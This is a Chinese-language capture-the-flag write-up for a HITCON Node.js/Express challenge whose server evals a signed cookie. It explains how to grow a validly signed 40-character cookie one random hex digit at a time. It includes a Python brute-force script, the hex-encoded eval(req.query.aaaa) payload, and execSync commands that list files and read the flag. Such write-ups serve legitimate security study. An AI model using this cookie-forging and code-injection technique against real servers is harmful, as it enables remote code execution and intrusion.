RCE

nodejs，express组件

主要源码

const express = require('express');
const cookieParser = require('cookie-parser')
const crypto = require('crypto');
const { ChildProcess } = require('child_process');
const { access } = require('fs/promises');

const randomHex = () => '0123456789abcdef'[~~(Math.random() * 16)];

const app = express();
app.use(cookieParser(crypto.randomBytes(20).toString('hex'))); // 随机20个字节

app.get('/', function (_, res) {
    res.cookie('code', '', { signed: true })
        .sendFile(__dirname + '/index.html');
});

app.get('/random', function (req, res) {
    let result = null;

    if (req.signedCookies.code.length >= 40) {
        const code = Buffer.from(req.signedCookies.code, 'hex').toString();
        try {
            result = eval(code);
        } catch {
            result = '(execution error)';
        }
        res.cookie('code', '', { signed: true })

            ({ progress: req.signedCookies.code.length, result: `Executing '${code}', result = ${result}` });
    } else {
        res.cookie('code', req.signedCookies.code + randomHex(), { signed: true })
            .send({ progress: req.signedCookies.code.length, result });
    }
});

没怎么接触过nodejs的题目，这段代码比较短，逐行搞懂逻辑也差不多

他这里会eval()一下cookie的值，cookie有签名认证，且密钥是随机数不可破解

想要伪造出合法cookie来进行命令执行。

逻辑概述

一开始，randomhex可以生成一个随机字符：

randomHex = () => ‘0123456789abcdef’[~~(Math.random() * 16)];

使用cookie加密技术，传入20个随机字符签名进行加密：

app.use(cookieParser(crypto.randomBytes(20).toString(‘hex’)));

第一次访问页面时，返回一个cookie，并且此时就已经生成了一个随机20个字符签名：

app.get('/', function (_, res) {
    res.cookie('code', '', { signed: true })
        .sendFile(__dirname + '/index.html');
    //console.log(res.cookie('code'));
});

点击RCE，前端js会一直访问/random

如果code没有40位，那么去到else，else会在原来code的基础上拼接上一个randomhex随机生成的字符，这样的话，每次code的长度都会加1，直到长度为40。

如果不是正确的cookie，那么一定是走else，然后result=null，因为判断Cookie是否正确的语句是if (req.signedCookies.code.length >= 40) ，当Cookie不正确时，req.signedCookies.code.length值是undefied。(“解析"签名cookie时，会校验签名的值是否合法，如合法，返回true，否则，返回false)

当Cookie不正确时，执行res.cookie(‘code’, req.signedCookies.code + randomHex()，这个语句生成的

Cookie是固定的十六种，因为传入的code总是拼接上一个randomhex随机生成的字符。

发一个包返回的set-Cookie就是下一个包你要发送的Cookie

所以可以第一个包发送的时候，可以多发几次，生成出自己想要的第一个随机数，然后拿他来作为下一次的Cookie，这样的话，完全可以构造出一串自己想要的40个字符的串。

从传入的cookie值中，分别提取出原始值A1、签名值B1。用同样的秘钥对A1进行签名，得到A2。根据A2、B1是否相等，判断签名是否合法。

以此原理，伪造出合法的cookie，也就是对应了无限猴子定理，只不过我们是逐个字符进行随机

编写一个脚本得到合法签名的cookie

import requests
import re

url = 'http://1n3obmsv1p.rce.chal.hitconctf.com/random'
cookie = "code=s%3A.KVdwI5cetDBBlBx%2BrnHv%2F79BDe7e049QlxtcpS0RuCQ" #题目环境原始cookie
pld = '6576616c287265712e71756572792e6161616129' #目标命令


for i in range(40):
    header={
        'Cookie':cookie
    }
    s=requests.get(url=url,headers=header)
    fanhui = s.headers.get('Set-cookie')
    fanhui2=fanhui[:re.search(';',fanhui).span()[0]] #正则保留code:xxxx;

    if fanhui2[9+i] == pld[i]:  #得到的set-cookie判断与相同则 以set-cookie当做请求cookie进行发包，继续跑下一位
        cookie=fanhui2
    else:
        while True: # 没有匹配上就循环跑随机
            s=requests.get(url=url,headers=header)
            fanhui = s.headers.get('Set-cookie')
            fanhui2= fanhui[:re.search(';', fanhui).span()[0]]
            if fanhui2[9+i] == pld[i]:
                cookie = fanhui2
                break
    print(pld[i],fanhui[9+i])
    print(fanhui2)

一个非常关键字的思路：逃逸

什么语言都是这样的，你在当前执行不了或者很难执行时，那就尝试去逃逸出来

这里逃逸的方法是，通过get一个参数name，name里是要执行的代码，再执行这个参数

就可以把当前的字符限制逃逸出来

express框架获取参数：req.query.name

最后的exp：

eval(req.query.aaaa)

（题目变成了：eval(eval(req.query.aaaa))，里面的eval作用是使req.query.aaaa解析成aaaa传参的命令，外面的eval是执行这个命令）

eval(req.query.aaaa)转成16进制变成40个字符：

6576616c287265712e71756572792e6161616129

把脚本里的need换成这串，用脚本生成出正确的Cookie：

code=s%3A6576616c287265712e71756572792e6161616129.4030hhayw8ycCKxx1mzQAHmqX6uxIri4glNqzeIQuvk

使用这个Cookie，再get传参?aaaa=require("child_process").execSync('ls')

?aaaa=require("child_process").execSync('cat%20/flag-1e5657085ea974db77cdef03cc5753833fea1668')

这个题目两个思路，一个是随机序列单个逐步可控，一个是通过传参逃逸字符限制
